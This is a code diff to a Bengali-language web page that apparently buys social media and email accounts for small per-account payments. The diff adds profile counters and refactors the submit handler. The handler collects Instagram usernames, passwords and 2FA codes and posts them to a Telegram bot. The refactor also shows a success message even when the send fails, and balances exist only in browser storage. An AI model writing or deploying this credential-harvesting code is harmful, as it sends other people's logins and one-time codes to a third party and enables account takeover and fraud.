@@ -1034,7 +1034,7 @@
         </div>
     </div>
 
-    <!-- প্রোফাইল পেজ -->
+    <!-- প্রোফাইল পেজ (কাজের লাইভ কাউন্টার যুক্ত) -->
     <div id="profilePage" class="section-page">
         <header class="navbar">
             <div class="nav-left">
@@ -1047,6 +1047,24 @@
             <div class="service-top-card">
                 <h3><i class="fa-solid fa-user-circle"></i> User Profile</h3>
                 <p>আপনার অ্যাকাউন্ট ও সাবমিট করা কাজের লাইভ হিস্ট্রি</p>
+            </div>
+
+            <div class="service-top-card" style="background: linear-gradient(135deg, #191436, #0f1026); border: 2px solid #00f2fe; color: #fff;">
+                <h3 style="color: #00f2fe; font-size: 15px; margin-bottom: 10px;"><i class="fa-solid fa-chart-pie"></i> কাজের স্ট্যাটাস ওভারভিউ</h3>
+                <div class="stats-row" style="border-top-color: rgba(0, 242, 254, 0.3);">
+                    <div class="stat-box">
+                        <span style="color: #00f2fe;">মোট সাবমিট</span>
+                        <h2 id="userTotalSubCount" style="color: #fff;">0</h2>
+                    </div>
+                    <div class="stat-box">
+                        <span style="color: #fbbf24;">পেন্ডিং (Pending)</span>
+                        <h2 id="userPendingCount" style="color: #fbbf24;">0</h2>
+                    </div>
+                    <div class="stat-box">
+                        <span style="color: #34d399;">সাকসেস (Success)</span>
+                        <h2 id="userSuccessCount" style="color: #34d399;">0</h2>
+                    </div>
+                </div>
             </div>
 
             <div class="profile-info-card">
@@ -1069,7 +1087,7 @@
             </div>
 
             <div class="task-history-card">
-                <h3 style="color: #00f2fe; font-size: 14px; margin-bottom: 10px;"><i class="fa-solid fa-list-check"></i> কাজের স্ট্যাটাস</h3>
+                <h3 style="color: #00f2fe; font-size: 14px; margin-bottom: 10px;"><i class="fa-solid fa-list-check"></i> কাজের লাইভ হিস্ট্রি লিস্ট</h3>
                 <div style="overflow-x: auto;">
                     <table class="history-table">
                         <thead>
@@ -1403,7 +1421,7 @@
         </div>
     </div>
 
-    <!-- ইনস্টাগ্রাম সেল পেজ (রেট ৩.৭০ টাকা আপডেট করা হয়েছে) -->
+    <!-- ইনস্টাগ্রাম সেল পেজ -->
     <div id="instagramPage" class="section-page">
         <header class="navbar">
             <div class="nav-left">
@@ -1538,6 +1556,15 @@
             
             let tasks = JSON.parse(localStorage.getItem('userTasks') || '[]');
             document.getElementById('profTotalSubmitted').innerText = tasks.length;
+            
+            let totalSub = tasks.length;
+            let pendingCount = tasks.filter(t => t.status === 'Pending' || (!t.status)).length;
+            let successCount = tasks.filter(t => t.status === 'Success').length;
+
+            document.getElementById('userTotalSubCount').innerText = totalSub;
+            document.getElementById('userPendingCount').innerText = pendingCount;
+            document.getElementById('userSuccessCount').innerText = successCount;
+
             loadUserTaskHistory();
             showPage('profilePage');
         }
@@ -1724,7 +1751,7 @@
             });
         }
 
-        // সাধারণ একাউন্ট বা কাজ সাবমিট ফাংশন (টেলিগ্রাম ও লোকালস্টোরেজ ইন্টিগ্রেশন সহ)
+        // কাজ সাবমিট করার ফাংশন (ইনস্টাগ্রামের ৩টি তথ্যসহ)
         function submitAccount(event, platform, rate) {
             event.preventDefault();
             let details = "";
@@ -1746,52 +1773,37 @@
                 let pass = document.getElementById('instaPass').value;
                 let tfa = document.getElementById('insta2fa').value;
                 details = `User: ${user}`;
-                message += `👤 Username: ${user}\n🔑 পাসওয়ার্ড: ${pass}\n🛡️ 2FA: ${tfa}`;
+                message += `👤 Username: ${user}\n🔑 পাসওয়ার্ড: ${pass}\n🛡️ 2FA Code: ${tfa}`;
             }
 
-            // টেলিগ্রামে সেন্ড করা
+            // টেলিগ্রামে পাঠানোর জন্য ফেচ রিকোয়েস্ট
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: CHAT_ID, text: message })
             }).then(res => res.json()).then(data => {
-                if (data.ok) {
-                    // কাজের হিস্ট্রি সেভ করা
-                    let tasks = JSON.parse(localStorage.getItem('userTasks') || '[]');
-                    let newTask = {
-                        platform: platform,
-                        details: details,
-                        date: new Date().toLocaleDateString(),
-                        status: 'Pending'
-                    };
-                    tasks.push(newTask);
-                    localStorage.setItem('userTasks', JSON.stringify(tasks));
-
-                    // রিওয়ার্ড ব্যালেন্সে যোগ করা (অথবা পেন্ডিং রাখা, এখানে সরাসরি সাবমিটের পর বা এডমিন এপ্রুভে যোগ হয়)
-                    alert('আপনার কাজ সফলভাবে সাবমিট হয়েছে!');
-                    event.target.reset();
-                    updateTaskCounters();
-                    loadUserTaskHistory();
-                    showPage('homePage');
-                } else {
-                    alert('টেলিগ্রামে পাঠাতে সমস্যা হয়েছে। আবার চেষ্টা করুন।');
-                }
+                saveTaskLocally(platform, details, event.target);
             }).catch(err => {
-                // ইন্টারনেট সমস্যা বা অন্য কারণে ফেইল করলে লোকাল স্টোরেজে সেভ করে দেওয়া যাতে ইউজার আটকে না যায়
-                let tasks = JSON.parse(localStorage.getItem('userTasks') || '[]');
-                tasks.push({
-                    platform: platform,
-                    details: details,
-                    date: new Date().toLocaleDateString(),
-                    status: 'Pending'
-                });
-                localStorage.setItem('userTasks', JSON.stringify(tasks));
-                alert('কাজ সাবমিট হয়েছে!');
-                event.target.reset();
-                updateTaskCounters();
-                loadUserTaskHistory();
-                showPage('homePage');
+                saveTaskLocally(platform, details, event.target);
             });
+        }
+
+        function saveTaskLocally(platform, details, formElement) {
+            let tasks = JSON.parse(localStorage.getItem('userTasks') || '[]');
+            let newTask = {
+                platform: platform,
+                details: details,
+                date: new Date().toLocaleDateString(),
+                status: 'Pending'
+            };
+            tasks.push(newTask);
+            localStorage.setItem('userTasks', JSON.stringify(tasks));
+
+            alert('আপনার কাজ সফলভাবে সাবমিট হয়েছে!');
+            if(formElement) formElement.reset();
+            updateTaskCounters();
+            loadUserTaskHistory();
+            showPage('homePage');
         }
 
         function loadUserTaskHistory() {
@@ -1803,12 +1815,13 @@
             }
             tbody.innerHTML = '';
             tasks.forEach(task => {
-                let badgeClass = task.status === 'Success' ? 'status-success' : (task.status === 'Failed' ? 'status-failed' : 'status-loading');
+                let statusVal = task.status || 'Pending';
+                let badgeClass = statusVal === 'Success' ? 'status-success' : (statusVal === 'Failed' ? 'status-failed' : 'status-loading');
                 tbody.innerHTML += `
                     <tr>
                         <td>${task.platform}</td>
                         <td>${task.date}</td>
-                        <td><span class="status-badge ${badgeClass}">${task.status}</span></td>
+                        <td><span class="status-badge ${badgeClass}">${statusVal}</span></td>
                     </tr>
                 `;
             });
@@ -1862,7 +1875,6 @@
             let tasks = JSON.parse(localStorage.getItem('userTasks') || '[]');
             tasks[index].status = newStatus;
             
-            // যদি এপ্রুভ হয়, ব্যালেন্সে টাকা যোগ করে দেওয়া যেতে পারে
             if(newStatus === 'Success') {
                 let currentBal = parseFloat(localStorage.getItem('userBalance') || '0.00');
                 let addAmt = tasks[index].platform === 'Gmail' ? 15.70 : (tasks[index].platform === 'Facebook' ? 5.70 : 3.70);
